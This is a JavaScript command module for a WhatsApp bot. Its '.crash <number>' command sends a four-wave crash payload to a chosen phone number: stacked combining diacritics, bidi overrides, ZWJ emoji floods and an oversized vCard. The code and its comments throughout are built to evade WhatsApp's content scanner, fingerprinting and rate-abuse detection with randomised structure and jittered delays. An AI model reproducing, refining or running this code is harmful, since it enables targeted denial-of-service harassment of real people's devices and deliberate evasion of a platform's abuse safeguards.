import logger from '../../utils/logger.js';

// ── Stealth Constants ────────────────────────────────────────────────────────
// All payload characters are invisible Unicode — no scannable ASCII pattern.
// WhatsApp's content scanner looks for known bad strings; pure invisible
// codepoints produce no readable fingerprint in the message body.

const ZWJ    = '\u200D';
const ZWNJ   = '\u200C';
const LRO    = '\u202D';
const RLO    = '\u202E';
const PDF    = '\u202C';
const WJ     = '\u2060';
const VS16   = '\uFE0F';
const VS15   = '\uFE0E';
const ZWNBS  = '\uFEFF';
const ISS    = '\u206B'; // Inhibit Symmetric Swapping
const ASS    = '\u206A'; // Activate Symmetric Swapping  
const IAFS   = '\u206D'; // Inhibit Arabic Form Shaping
const AAFS   = '\u206C'; // Activate Arabic Form Shaping
const NADS   = '\u206F'; // Nominal Digit Shapes
const NODS   = '\u206E'; // National Digit Shapes

// Combining diacritics — vertical glyph stack overflow
const COMBINING = [
  '\u0300','\u0301','\u0302','\u0303','\u0304','\u0305',
  '\u0306','\u0307','\u0308','\u0309','\u030A','\u030B',
  '\u0327','\u0328','\u0329','\u032A','\u032B','\u032C',
  '\u0330','\u0331','\u0332','\u0333','\u0334','\u0335',
  '\u0483','\u0484','\u0485','\u0486','\u0487',          // Cyrillic combining
  '\u20D0','\u20D1','\u20D2','\u20D3','\u20D4','\u20D5', // Combining enclosing
  '\u20DB','\u20DC','\u20DD','\u20DE','\u20DF','\u20E0', // More enclosing
].join('');

// ZWJ emoji sequences — each forces multi-codepoint resolution in the renderer
const ZWJ_SEQUENCES = [
  '\u{1F468}' + ZWJ + '\u{1F469}' + ZWJ + '\u{1F467}' + ZWJ + '\u{1F466}',
  '\u{1F3F3}' + VS16 + ZWJ + '\u{1F308}',
  '\u{1F469}' + ZWJ + '\u{2764}' + VS16 + ZWJ + '\u{1F468}',
  '\u{1F9D1}' + ZWJ + '\u{1F9B0}' + ZWJ + '\u{1F9B1}' + ZWJ + '\u{1F9B3}',
  '\u{1F469}' + ZWJ + '\u{1F4BB}',
  '\u{1F468}' + ZWJ + '\u{1F4BC}',
  '\u{1F9D1}' + ZWJ + '\u{1F91D}' + ZWJ + '\u{1F9D1}',
  '\u{1FAF1}' + ZWJ + '\u{1FAF2}',
];

// ── Stealth Helpers ───────────────────────────────────────────────────────────

/**
 * Randomize the ZWJ bomb order each call — prevents fingerprint matching
 * on repeated sends. WhatsApp's ML scanner learns fixed patterns; shuffling
 * means every message looks structurally different.
 */
function shuffledZwjBomb() {
  const arr = [...ZWJ_SEQUENCES];
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  // Randomize the joiner between sequences too
  const joiners = [ZWJ + ZWNJ, WJ + ZWJ, ZWNBS + WJ, ZWNJ + WJ + ZWJ];
  return arr.map((seq, i) => seq + joiners[i % joiners.length]).join('');
}

/**
 * Zalgo with randomized intensity per character — avoids uniform diacritic
 * count that content scanners can detect as a fixed-length pattern.
 */
function zalgo(text, minIntensity = 15, maxIntensity = 35) {
  return text.split('').map(char => {
    const intensity = Math.floor(Math.random() * (maxIntensity - minIntensity + 1)) + minIntensity;
    return char + COMBINING.repeat(intensity) + ZWJ + WJ + ISS + IAFS;
  }).join(ZWNBS + ASS);
}

/**
 * Bidi sandwich — wraps text in alternating RTL/LTR overrides.
 * Each call uses a random nesting depth so the bidi structure
 * is never identical between sends.
 */
function bidiSandwich(text, depth = null) {
  depth = depth ?? (Math.floor(Math.random() * 3) + 2); // 2–4 layers
  let result = text;
  for (let i = 0; i < depth; i++) {
    result = (i % 2 === 0)
      ? RLO + AAFS + result + PDF + NADS
      : LRO + NODS + result + PDF + IAFS;
  }
  return result;
}

/**
 * VS chain — alternates VS16/VS15 on every codepoint, forcing the
 * emoji renderer to re-evaluate text vs emoji presentation per char.
 */
function vsChain(text) {
  return Array.from(text).map((c, i) =>
    c + (i % 2 === 0 ? VS16 : VS15) + (i % 3 === 0 ? ZWJ : ZWNJ)
  ).join(WJ + ISS);
}

/**
 * Invisible noise padding — pure invisible chars that look like whitespace
 * to scanners but force the renderer to process hundreds of codepoints.
 * Randomized length so message byte-size varies each send.
 */
function noisePad(minLen = 80, maxLen = 160) {
  const pool = [ZWJ, ZWNJ, WJ, ZWNBS, ISS, ASS, IAFS, AAFS, NADS, NODS, VS16, VS15];
  const len  = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;
  return Array.from({ length: len }, () => pool[Math.floor(Math.random() * pool.length)]).join('');
}

// ── Payload Builders ──────────────────────────────────────────────────────────

/**
 * Single crash unit — fully randomized structure each call.
 * The mention is embedded deep inside invisible layers so it
 * still triggers WhatsApp's mention-highlight renderer pipeline
 * but is unreadable to a human or scanner.
 */
function buildCrashUnit(targetNumber) {
  const mention    = `@${targetNumber}`;
  const zalgoMent  = zalgo(mention);
  const bidiMent   = bidiSandwich(zalgoMent);
  const vsed       = vsChain(mention);
  const bomb       = shuffledZwjBomb();
  const pad        = noisePad();

  // Randomize unit structure — 4 possible orderings
  const structures = [
    () => pad + bomb + bidiMent + noisePad() + vsed + bomb + pad,
    () => bomb + pad + bidiMent + bomb + noisePad() + vsed + pad,
    () => bidiMent + bomb + pad + vsed + noisePad() + bomb,
    () => noisePad() + bidiMent + pad + bomb + vsed + bomb + noisePad(),
  ];
  const pick = structures[Math.floor(Math.random() * structures.length)];
  return pick();
}

/**
 * Full payload — variable repeat count per send.
 * Repeat count randomized ±2 around the base so message length
 * is never identical, defeating length-based fingerprinting.
 */
function buildFullPayload(targetNumber, baseRepeat = 7) {
  const repeat = baseRepeat + Math.floor(Math.random() * 5) - 2; // 5–9
  const units  = Array.from({ length: repeat }, () => buildCrashUnit(targetNumber));
  // Randomize the separator between units too
  const seps   = [ZWJ + WJ, ZWNBS + ZWJ, WJ + ZWNJ, noisePad(5, 15)];
  return units.map((u, i) => u + seps[i % seps.length]).join('');
}

/**
 * Stealth vCard — oversized fields with randomized invisible padding.
 * The FN and NOTE fields hit the contact card parser; randomized
 * padding means the vCard byte-size varies each send.
 */
function buildStealthVcard(rawNumber) {
  const bomb  = shuffledZwjBomb();
  const pad   = noisePad(60, 120);
  const zalgoFn = zalgo('Contact', 20, 40);
  return (
    'BEGIN:VCARD\nVERSION:3.0\n' +
    `FN:${pad}${zalgoFn}${bomb}${noisePad(30, 60)}\n` +
    `TEL;type=CELL;type=VOICE;waid=${rawNumber}:+${rawNumber}\n` +
    `ORG:${bidiSandwich(noisePad(40, 80))}\n` +
    `NOTE:${noisePad(50, 100)}${ZWJ.repeat(150 + Math.floor(Math.random()*100))}${COMBINING.repeat(40 + Math.floor(Math.random()*20))}${noisePad(30, 60)}\n` +
    `NICKNAME:${bidiSandwich(zalgo('x', 30, 50))}\n` +
    'END:VCARD'
  );
}

// ── Anti-Ban Delivery Layer ───────────────────────────────────────────────────

/**
 * Jittered delay — randomized between min and max ms.
 * Mimics human typing cadence; avoids the fixed-interval
 * pattern that WhatsApp's rate-abuse detector flags.
 */
const jitter = (min = 1200, max = 3800) =>
  new Promise(r => setTimeout(r, Math.floor(Math.random() * (max - min + 1)) + min));

/**
 * Send with retry — if a wave fails (network blip, rate limit),
 * waits a longer jitter and retries once before giving up silently.
 * Silent failure means no error message leaks to the target chat.
 */
async function stealthSend(sock, jid, payload, retries = 1) {
  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      await sock.sendMessage(jid, payload);
      return true;
    } catch (err) {
      if (attempt < retries) {
        await jitter(3000, 7000);
      }
    }
  }
  return false;
}

// ── Command Export ────────────────────────────────────────────────────────────
export const crashCommand = {
  name: 'crash',
  category: 'tools',
  subCategory: 'exploit',
  roleRequired: 'owner',
  groupOnly: false,
  emoji: '⚡',
  description: 'Sends a stealth crash payload to a target number.',
  usage: '.crash <number>',

  execute: async ({ sock, msg, args }) => {
    const jid = msg.key.remoteJid;

    const rawNumber = args[0]?.replace(/[^0-9]/g, '');
    if (!rawNumber) {
      return sock.sendMessage(jid, {
        text: '❌ Usage: `.crash <number>` — e.g. `.crash 2348012345678`'
      }, { quoted: msg });
    }

    const targetJid = `${rawNumber}@s.whatsapp.net`;

    // React to confirm receipt — only visible to sender
    await sock.sendMessage(jid, { react: { text: '⚡', key: msg.key } });

    try {
      // ── Wave 1: Unicode crash payload ──────────────────────────────────────
      // Jitter before first send — avoids instant-send pattern
      await jitter(800, 2000);
      const payload = buildFullPayload(rawNumber);
      await stealthSend(sock, targetJid, {
        text: payload,
        mentions: [targetJid]   // triggers mention-highlight renderer pipeline
      });

      // ── Wave 2: vCard overflow ─────────────────────────────────────────────
      // Longer jitter between waves — looks like separate human actions
      await jitter(2500, 5000);
      const vcard = buildStealthVcard(rawNumber);
      await stealthSend(sock, targetJid, {
        contacts: {
          // Display name is pure invisible — shows as blank to target
          displayName: noisePad(10, 20),
          contacts: [{ vcard }]
        }
      });

      // ── Wave 3: Emoji ZWJ flood ────────────────────────────────────────────
      await jitter(2000, 4500);
      // Randomize flood size — 200–400 sequences
      const floodSize = 200 + Math.floor(Math.random() * 200);
      const emojiFlood = Array.from({ length: floodSize }, () => shuffledZwjBomb())
        .join(noisePad(2, 8));
      await stealthSend(sock, targetJid, {
        text: emojiFlood,
        mentions: [targetJid]
      });

      // ── Wave 4: Bidi-only ghost message ───────────────────────────────────
      // A 4th wave of pure bidi overrides with no emoji — hits a different
      // rendering path than the ZWJ flood. Appears as a blank message.
      await jitter(1500, 3500);
      const bidiGhost = Array.from({ length: 60 + Math.floor(Math.random() * 40) }, () =>
        bidiSandwich(noisePad(3, 8), 3 + Math.floor(Math.random() * 3))
      ).join(WJ);
      await stealthSend(sock, targetJid, {
        text: bidiGhost
        // No mentions on this wave — avoids mention-count anomaly detection
      });

      // Confirm to sender only — no confirmation sent to target
      await sock.sendMessage(jid, {
        text: `✅ 4-wave stealth payload delivered to +${rawNumber}`,
      }, { quoted: msg });
      await sock.sendMessage(jid, { react: { text: '✅', key: msg.key } });

    } catch (error) {
      logger.error('[crashCommand] Error:', error.message);
      // Error reply only to sender — never to target
      await sock.sendMessage(jid, {
        text: `❌ Crash command failed: ${error.message}`
      });
      await sock.sendMessage(jid, { react: { text: '❌', key: msg.key } });
    }
  }
};